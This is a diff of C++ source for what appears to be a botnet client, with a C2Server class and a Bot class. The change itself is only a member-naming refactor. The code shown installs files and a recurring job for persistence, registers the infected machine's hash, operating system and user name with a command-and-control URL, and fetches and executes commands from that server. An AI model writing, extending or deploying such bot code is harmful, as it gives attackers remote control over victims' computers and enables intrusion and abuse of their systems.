@@ -11,24 +11,24 @@ const std::string HASH_TYPE("SHA256");
 class C2Server {
    public:
     C2Server(const std::string& registerUrl, const std::string& cmdUrl) {
-        _registerUrl = registerUrl;
-        _cmdUrl = cmdUrl;
+        registerUrl_ = registerUrl;
+        cmdUrl_ = cmdUrl;
     }
 
-    std::string getRegisterUrl() { return _registerUrl; }
-    std::string getCmdUrl() { return _cmdUrl; }
+    std::string getRegisterUrl() { return registerUrl_; }
+    std::string getCmdUrl() { return cmdUrl_; }
 
    private:
-    std::string _registerUrl, _cmdUrl;
+    std::string registerUrl_, cmdUrl_;
 };
 
 class Bot {
    public:
     Bot(const std::string& seedPath, const std::string& regUrl,
         const std::string& cmdUrl) {
-        _hashType = HASH_TYPE;
-        _seed = std::make_unique<Seed>(seedPath);
-        _c2Server = std::make_unique<C2Server>(regUrl, cmdUrl);
+        hashType_ = HASH_TYPE;
+        seed_ = std::make_unique<Seed>(seedPath);
+        c2Server_ = std::make_unique<C2Server>(regUrl, cmdUrl);
     }
 
     void init();
@@ -37,66 +37,66 @@ class Bot {
     void executeCommand();
 
    private:
-    std::string _hashType, _hashSum, _os, _user;
-    std::unique_ptr<Seed> _seed;
-    std::unique_ptr<C2Server> _c2Server;
+    std::string hashType_, hashSum_, os_, user_;
+    std::unique_ptr<Seed> seed_;
+    std::unique_ptr<C2Server> c2Server_;
 
-    void _prepareSysInfo();
+    void prepareSysInfo_();
 };
 
 void Bot::init() {
     // Install files and components
     install::installFiles();
-    _seed->initSeed();
+    seed_->initSeed();
     registerBot();
     install::initRecurringJob();
 }
 
-bool Bot::isInit() { return _seed->exists(); }
+bool Bot::isInit() { return seed_->exists(); }
 
 void Bot::registerBot() {
     // Register bot with C2 server
-    _prepareSysInfo();
+    prepareSysInfo_();
     request::PostForm postForm;
     postForm.addField("version", AURA_VERSION);
-    postForm.addField("hash_type", _hashType);
-    postForm.addField("hash_sum", _hashSum);
-    postForm.addField("operating_sys", _os);
-    postForm.addField("user", _user);
-    request::post(_c2Server->getRegisterUrl(), postForm.toString());
+    postForm.addField("hash_type", hashType_);
+    postForm.addField("hash_sum", hashSum_);
+    postForm.addField("operating_sys", os_);
+    postForm.addField("user", user_);
+    request::post(c2Server_->getRegisterUrl(), postForm.toString());
 }
 
 void Bot::executeCommand() {
     // Update system info and create POST form
-    _prepareSysInfo();
+    prepareSysInfo_();
     request::PostForm postForm;
     postForm.addField("version", AURA_VERSION);
-    postForm.addField("hash_sum", _hashSum);
+    postForm.addField("hash_sum", hashSum_);
 
     std::string response =
-        request::post(_c2Server->getCmdUrl(), postForm.toString());
+        request::post(c2Server_->getCmdUrl(), postForm.toString());
 
     // Parse response and execute based on parameters
     Command cmd(response);
     cmd.execute();
 }
 
-void Bot::_prepareSysInfo() {
+void Bot::prepareSysInfo_() {
     // Init or retrieve seed
-    if (_seed->exists()) {
-        _seed->getSeed();
+    if (seed_->exists()) {
+        seed_->getSeed();
     } else {
-        _seed->initSeed();
+        seed_->initSeed();
     }
 
     // Retrieve values if they haven't been already
-    if (!(_hashSum.size())) {
-        _hashSum = _seed->getHash();
+    if (!(hashSum_.size())) {
+        hashSum_ = seed_->getHash();
     }
-    if (!(_os.size())) {
-        _os = util::getOS();
+    if (!(os_.size())) {
+        os_ = util::getOS();
     }
-    if (!(_user.size())) {
-        _user = util::getUser();
+    if (!(user_.size())) {
+        user_ = util::getUser();
     }
 }
